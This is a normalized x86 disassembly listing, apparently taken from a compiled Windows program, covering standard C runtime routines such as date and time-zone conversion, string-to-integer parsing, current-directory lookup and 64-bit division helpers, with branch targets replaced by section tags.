call sub_443b37
mov [ eax ] 0xc
jmp r-xdata
sub_446eea
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
cmp [ esi + 0x2 ] 0x3a
push edi
mov ecx esi
jne r-xdata
movzx edx [ ecx ]
cmp dx 0x5c
je r-xdata
lea ecx [ esi + 0x4 ]
cmp [ ecx + 0x2 ] 0x0
je r-xdata
cmp dx 0x2f
jne r-xdata
mov edi 0x4040
test al 0x10
jne r-xdata
mov eax edi
shr eax 0x3
and eax 0x38
or edi eax
mov eax edi
shr eax 0x6
and eax 0x7
or eax edi
pop edi
pop esi
pop ebp
retn
push r--data
push esi
call sub_451b4b
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi 0x8000
test dx dx
jne r-xdata
or edi 0x40
push r--data
push esi
call sub_451b4b
pop ecx
pop ecx
test eax eax
je r-xdata
shl eax 0x7
not eax
and eax 0x80
or eax 0x100
push 0x2e
push esi
or edi eax
call sub_451bde
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push r--data
push esi
call sub_451b4b
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push esi
call sub_451b4b
pop ecx
pop ecx
test eax eax
jne r-xdata
sub_446fad
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
add esi 0xfffff894
cmp esi 0x46
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] eax
jl r-xdata
call sub_443b37
mov [ eax ] 0x16
or eax 0xffffffff
or edx eax
cmp esi 0x44c
jg r-xdata
mov ebx [ ebp + 0xc ]
lea eax [ ebx - 0x1 ]
cmp eax 0xb
ja r-xdata
cmp [ ebp + 0x14 ] 0x17
ja r-xdata
cmp [ ebp + 0x18 ] 0x3b
ja r-xdata
cmp [ ebp + 0x1c ] 0x3b
ja r-xdata
cmp [ ebp + 0x10 ] 0x1
jl r-xdata
lea eax [ ebx * 4 + rw-data ]
mov ecx [ eax - 0x4 ]
mov eax [ eax ]
sub eax ecx
cmp eax [ ebp + 0x10 ]
mov edi 0x190
jge r-xdata
mov eax [ ebp + 0x10 ]
add ecx eax
mov eax esi
and eax 0x80000003
mov [ ebp + 0x8 ] ecx
jns r-xdata
mov eax esi
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ esi + 0x76c ]
cdq
mov ecx edi
idiv ecx
test edx edx
jne r-xdata
mov eax esi
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
lea eax [ esi + 0x76c ]
cdq
mov ebx edi
idiv ebx
test edx edx
jne r-xdata
mov eax esi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ esi + 0x12b ]
cdq
idiv edi
lea ecx [ esi - 0x1 ]
push 0x64
pop ebx
push 0x0
push 0x16d
mov edi eax
mov eax ecx
cdq
idiv ebx
sub edi eax
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ edi + eax - 0x11 ]
cdq
mov ebx eax
mov eax edx
mov [ ebp - 0x10 ] eax
mov eax esi
cdq
sub eax 0x46
sbb edx 0x0
push edx
push eax
call sub_44de40
add ebx eax
mov eax [ ebp - 0x10 ]
adc eax edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
cdq
add ebx eax
mov eax [ ebp - 0x10 ]
adc eax edx
xor edi edi
push edi
push 0x18
push eax
push ebx
call sub_44de40
mov ecx eax
mov eax [ ebp + 0x14 ]
mov ebx edx
cdq
push edi
add ecx eax
push 0x3c
adc ebx edx
push ebx
push ecx
call sub_44de40
mov ecx eax
mov eax [ ebp + 0x18 ]
mov ebx edx
cdq
push edi
add ecx eax
push 0x3c
adc ebx edx
push ebx
push ecx
call sub_44de40
mov edi eax
mov eax [ ebp + 0x1c ]
mov ebx edx
cdq
add edi eax
adc ebx edx
call sub_447e00
lea eax [ ebp - 0x8 ]
push eax
call sub_447e90
pop ecx
test eax eax
je r-xdata
cmp ebx 0x2
jle r-xdata
mov ebx [ ebp + 0xc ]
cmp ebx 0x2
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_447ec9
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440669
add esp 0x14
inc [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] 0x1d
jg r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_447f02
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440669
add esp 0x14
mov eax [ ebp - 0x4 ]
cdq
add edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
adc ebx edx
dec eax
cmp [ ebp + 0x20 ] 0x1
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x34 ] eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440669
add esp 0x14
mov eax [ ebp - 0xc ]
cdq
add edi eax
adc ebx edx
cmp [ ebp + 0x20 ] 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax edi
mov edx ebx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
call sub_447e4f
pop ecx
test eax eax
je r-xdata
sub_447218
mov edi edi
push ebp
mov ebp esp
sub esp 0x114
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x110 ] 0x0
push ebx
push esi
push edi
mov edi [ GetCurrentDirectoryA@IAT ]
lea ebx [ ebp - 0x10c ]
mov eax ebx
push eax
push 0x105
call edi
mov esi eax
cmp esi 0x104
jle r-xdata
xor edi edi
test esi esi
je r-xdata
lea eax [ esi + 0x1 ]
push 0x1
push eax
mov [ ebp - 0x114 ] eax
call sub_445f7b
mov ebx eax
pop ecx
pop ecx
test ebx ebx
jne r-xdata
call sub_443b37
mov [ eax ] 0xc
cmp [ ebx + 0x1 ] 0x3a
jne r-xdata
mov [ ebp - 0x110 ] 0x1
test esi esi
je r-xdata
call sub_443b37
mov [ eax ] 0xc
xor esi esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
push ebx
call sub_44120e
pop ecx
cmp [ ebp - 0x110 ] 0x0
je r-xdata
movzx eax [ ebx ]
push eax
call sub_451d20
mov edi eax
pop ecx
sub edi 0x40
jmp r-xdata
push ebx
push [ ebp - 0x114 ]
call edi
mov esi eax
sub_4472e1
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_441455
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_451d4c
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_44a27e
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4473a9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
movzx edx [ eax ]
push ebx
push esi
push edi
test dx dx
je r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
movzx edi [ ebx ]
inc eax
inc eax
movzx edx [ eax ]
test dx dx
jne r-xdata
movzx ecx di
mov esi ebx
test di di
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
inc esi
movzx ecx [ esi ]
test cx cx
jne r-xdata
cmp cx dx
je r-xdata
sub_4473ec
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_441455
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_443b37
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_44cda9
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_443b37
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_44761b
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_4473ec
add esp 0x14
pop ebp
retn
sub_447650
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4476eb
push 0x2c
push r--data
call sub_4433dc
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_447f4d
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_447f02
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_447e90
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_447ec9
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
call sub_451edf
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_451e58
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_44120e
pop ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
push esi
call sub_442e20
inc eax
push eax
call sub_445f36
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_443c90
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_443421
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_451da3
add esp 0x10
test eax eax
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_442e20
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_443bb7
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push [ ebp - 0x1c ]
call sub_4476da
push [ ebp - 0x24 ]
call sub_4476b8
push [ ebp - 0x28 ]
call sub_4476c9
add esp 0xc
mov [ ebp - 0x4 ] 0xfffffffe
call sub_447997
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
jmp r-xdata
push eax
call sub_44120e
pop ecx
push esi
call sub_440ca3
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_440ca3
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_451da3
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_447f47
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_447f3b
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_440ca3
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_447a31
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
mov eax edi
jne r-xdata
and eax 0x80000003
jns r-xdata
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
mov [ ebp - 0xc ] eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov esi [ esi * 4 + rw-data ]
mov esi [ esi * 4 + rw-data ]
jmp r-xdata
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ rw-data ] esi
mov [ rw-data ] ecx
call sub_447ec9
pop ecx
test eax eax
je r-xdata
mov [ rw-data ] esi
mov [ rw-data ] ecx
mov [ rw-data ] edi
jmp r-xdata
add esi [ ebp + 0x1c ]
add esi eax
lea esi [ esi + eax - 0x7 ]
jmp r-xdata
mov [ ebp + 0xc ] eax
lea eax [ edi + 0x12b ]
cdq
lea ebx [ edi - 0x1 ]
mov edi 0x190
idiv edi
push 0x64
pop edi
inc esi
push 0x7
mov [ ebp - 0x8 ] eax
mov eax ebx
cdq
idiv edi
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
sub edx eax
mov ebx edx
lea eax [ edi - 0x1 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov edx edi
imul edx edx 0x16d
add eax esi
add eax ebx
lea eax [ edx + eax - 0x63db ]
cdq
pop ebx
idiv ebx
mov eax [ ebp + 0x14 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x18 ]
cmp edx [ ebp + 0x18 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x3e8
add [ rw-data ] eax
jns r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440669
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
imul ecx ecx 0x3c
add ecx [ ebp + 0x20 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x24 ]
imul ecx ecx 0x3e8
add ecx [ ebp + 0x28 ]
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x5
jne r-xdata
mov eax 0x5265c00
cmp [ rw-data ] eax
jl r-xdata
add [ rw-data ] 0x5265c00
dec [ rw-data ]
jmp r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov [ rw-data ] edi
sub [ rw-data ] eax
inc [ rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
jmp r-xdata
sub esi 0x7
jmp r-xdata
cmp esi eax
jle r-xdata
sub_447c28
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
call sub_447e90
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_440669
add esp 0x14
mov edx [ edi + 0x14 ]
push ebx
xor ebx ebx
inc ebx
cmp edx [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp edx [ rw-data ]
je r-xdata
pop esi
leave
retn
cmp edx 0x6b
push 0x3
pop eax
push 0x2
pop ecx
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
jge r-xdata
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp ecx eax
mov edx [ edi + 0x1c ]
jge r-xdata
push esi
push esi
push esi
push esi
push esi
push ecx
push edx
push ebx
push ebx
push 0x2
pop ecx
call sub_447a31
mov eax [ ebp - 0xc ]
push esi
push esi
push esi
push esi
push esi
push [ ebp - 0x8 ]
push [ edi + 0x14 ]
push ebx
push esi
push 0x2
pop ecx
call sub_447a31
add esp 0x48
push 0x4
pop eax
mov ecx ebx
mov [ ebp - 0xc ] 0xa
mov [ ebp - 0x8 ] 0x5
movzx eax [ rw-data ]
push eax
push esi
push esi
push edx
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push edx
push ebx
jmp r-xdata
cmp edx eax
jl r-xdata
cmp edx ecx
jl r-xdata
movzx eax [ rw-data ]
push eax
push esi
push esi
push [ edi + 0x14 ]
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push [ edi + 0x14 ]
push ebx
jmp r-xdata
movzx eax [ rw-data ]
push ebx
call sub_447a31
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
add esp 0x24
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov eax ebx
cmp edx ecx
jg r-xdata
xor eax eax
jmp r-xdata
cmp edx eax
jg r-xdata
movzx eax [ rw-data ]
push esi
call sub_447a31
add esp 0x24
jmp r-xdata
cmp edx eax
jle r-xdata
pop ebx
cmp edx ecx
jle r-xdata
mov eax [ edi + 0x8 ]
imul eax eax 0x3c
add eax [ edi + 0x4 ]
imul eax eax 0x3c
add eax [ edi ]
imul eax eax 0x3e8
cmp edx ecx
jne r-xdata
cmp edx ecx
jge r-xdata
cmp edx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
xor ecx ecx
cmp eax [ rw-data ]
setge cl
jmp r-xdata
mov eax ecx
jmp r-xdata
sub_447e00
push 0x8
push r--data
call sub_4433dc
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_443421
retn
push 0x6
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_447e46
call sub_4476eb
inc [ rw-data ]
sub_447e4f
push 0xc
push r--data
call sub_4433dc
push 0x6
call sub_4488e6
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
call sub_447c28
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_447e87
mov eax [ ebp - 0x1c ]
call sub_443421
retn
sub_447e90
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_447ec9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_447f02
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_447f60
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_448010
push ebx
push edi
xor edi edi
